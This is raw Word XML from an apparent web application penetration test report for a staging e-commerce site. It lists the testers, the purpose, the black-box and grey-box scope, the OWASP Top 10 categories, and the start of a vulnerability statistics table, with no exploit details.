            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5103" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BD95188" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>PhucLT</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3540" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B19A04E" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pentester</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00865CF1" w:rsidRPr="00706ED0" w14:paraId="41279844" w14:textId="77777777" w:rsidTr="00865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112C31" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00DC18FD" w:rsidRDefault="00C170BC" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5103" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BD95188" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>QuanHX</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3540" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B19A04E" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pentester</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00865CF1" w:rsidRPr="00706ED0" w14:paraId="41279844" w14:textId="77777777" w:rsidTr="00865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112C31" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00DC18FD" w:rsidRDefault="00C170BC" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5103" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BD95188" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>KietNguyen</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3540" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B19A04E" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pentester</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00865CF1" w:rsidRPr="00706ED0" w14:paraId="41279844" w14:textId="77777777" w:rsidTr="00865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112C31" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00DC18FD" w:rsidRDefault="00C170BC" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5103" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BD95188" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>DatVT</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3540" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B19A04E" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pentester</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00865CF1" w:rsidRPr="00706ED0" w14:paraId="41279844" w14:textId="77777777" w:rsidTr="00865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112C31" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00DC18FD" w:rsidRDefault="00C170BC" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00865CF1">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5103" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BD95188" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>SVTTHPT</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3540" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B19A04E" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00706ED0" w:rsidRDefault="00767D37" w:rsidP="0030517C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pentester</w:t>
            </w:r>
            <w:r w:rsidR="00795C9C">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="270950EE" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="00D870BD" w:rsidP="0030517C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>PURPOSE OF ASSESSMENT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B728757" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="00843511" w:rsidP="0030517C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Security test for web application</w:t>
      </w:r>
      <w:r w:rsidR="0030517C">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BED604" w14:textId="77777777" w:rsidR="0030517C" w:rsidRPr="00D24D27" w:rsidRDefault="00843511" w:rsidP="0030517C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Determine vulnerabilities in application in scope of assessment early to prevent exploitation</w:t>
      </w:r>
      <w:r w:rsidR="0030517C">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B25473F" w14:textId="77777777" w:rsidR="00292AAB" w:rsidRDefault="00AC213D" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc34146491"/>
      <w:r>
        <w:t xml:space="preserve">SCOPE OF </w:t>
      </w:r>
      <w:r w:rsidR="00843511">
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:t>ASSESSMENT</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="502B1606" w14:textId="77777777" w:rsidR="0089065C" w:rsidRPr="004A61ED" w:rsidRDefault="005E1C4E" w:rsidP="0089065C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Name</w:t>
      </w:r>
      <w:r w:rsidR="0089065C" w:rsidRPr="004A61ED">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00A846A7">
        <w:t>NK Online - QAS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF8D1BA" w14:textId="77777777" w:rsidR="0089065C" w:rsidRPr="004A61ED" w:rsidRDefault="005E1C4E" w:rsidP="0089065C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Domain/URL</w:t>
      </w:r>
      <w:r w:rsidR="0089065C" w:rsidRPr="004A61ED">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00DD0918">
        <w:t>https://staging2.nguyenkimmall.com/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2792957A" w14:textId="77777777" w:rsidR="0089065C" w:rsidRPr="004A61ED" w:rsidRDefault="008D63EC" w:rsidP="0089065C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Scope of assessment</w:t>
      </w:r>
      <w:r w:rsidR="0089065C" w:rsidRPr="004A61ED">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7D390B" w14:textId="77777777" w:rsidR="0089065C" w:rsidRDefault="0089065C" w:rsidP="0089065C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="004A61ED">
        <w:t>Black</w:t>
      </w:r>
      <w:r w:rsidR="005E1C4E">
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="004A61ED">
        <w:t xml:space="preserve">ox: </w:t>
      </w:r>
      <w:r w:rsidR="008D63EC">
        <w:t>Perform pentest without any information of Web application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08023F07" w14:textId="77777777" w:rsidR="005E1C4E" w:rsidRDefault="005E1C4E" w:rsidP="0089065C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>GreyBox: Perform using normal user, registered user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5938B5D3" w14:textId="77777777" w:rsidR="00297F3B" w:rsidRDefault="00A62970" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc34146492"/>
      <w:r>
        <w:t>ASSESSMENT STANDARD</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="6FA44806" w14:textId="77777777" w:rsidR="00022518" w:rsidRDefault="00022518" w:rsidP="00022518">
      <w:r>
        <w:t>The assessment method is based on OWASP Top 10 Web Category which defines top common category and vulnerablities in Web Appilcation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6C0F5C" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A1 Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2895F598" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A2 Broken Authentication and Session Management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFB9266" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A3 Cross-Site Scripting (XSS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2C2627" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A4 Insecure Direct Object References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C06A81" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A5 Security Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC2A385" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A6 Sensitive Data Exposure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F07D1D2" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A7 Missing Function Level Access Control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A096171" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A8 Cross-Site Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EC2B82" w14:textId="77777777" w:rsidR="00FA5645" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A9 Using Components with Known Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734DCC93" w14:textId="77777777" w:rsidR="00297F3B" w:rsidRDefault="00FA5645" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>A10 Unvalidated Redirects and Forwards</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAE2602" w14:textId="77777777" w:rsidR="00CD2750" w:rsidRDefault="00CD2750" w:rsidP="00CD2750">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc34146493"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>EXECUTIVE SUMMARY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F4BEEA" w14:textId="77777777" w:rsidR="0053766E" w:rsidRDefault="007476B7" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="0053766E">
        <w:t>VULNERABILITIES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> STATISTICS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="294D0CF2" w14:textId="77777777" w:rsidR="00843511" w:rsidRDefault="00843511" w:rsidP="00843511">
      <w:r>
        <w:t>Below is statistics chart of vulnerabilities categorized by severity level in application</w:t>
      </w:r>
      <w:r w:rsidR="007B584C">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF67603" w14:textId="77777777" w:rsidR="00F52B8C" w:rsidRPr="006C489C" w:rsidRDefault="00F52B8C" w:rsidP="006C489C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001775E8">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="7030A0"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67449945" wp14:editId="4DB8C801">
            <wp:extent cx="5760000" cy="3168000"/>
            <wp:effectExtent l="0" t="0" r="6350" b="762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Style w:val="GridTable4-Accent11"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="704"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="6942"/>
      </w:tblGrid>
      <w:tr w:rsidR="007B584C" w:rsidRPr="004A61ED" w14:paraId="74C04BD0" w14:textId="77777777" w:rsidTr="006D673D">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04" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:bookmarkEnd w:id="1"/>
          <w:p w14:paraId="0919F941" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00071B0F" w:rsidRDefault="007B584C" w:rsidP="007B584C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00071B0F">
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="447BF3E0" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00071B0F" w:rsidRDefault="007B584C" w:rsidP="007B584C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00071B0F">
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6942" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6247BA3B" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00071B0F" w:rsidRDefault="007B584C" w:rsidP="007B584C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00071B0F">
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>VULNERABILITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00086E78" w:rsidRPr="004A61ED" w14:paraId="5BBC4CE9" w14:textId="77777777" w:rsidTr="006D673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04" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1029575D" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">
            <w:pPr>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:bCs w:val="0"/>
                <w:sz w:val="21"/>
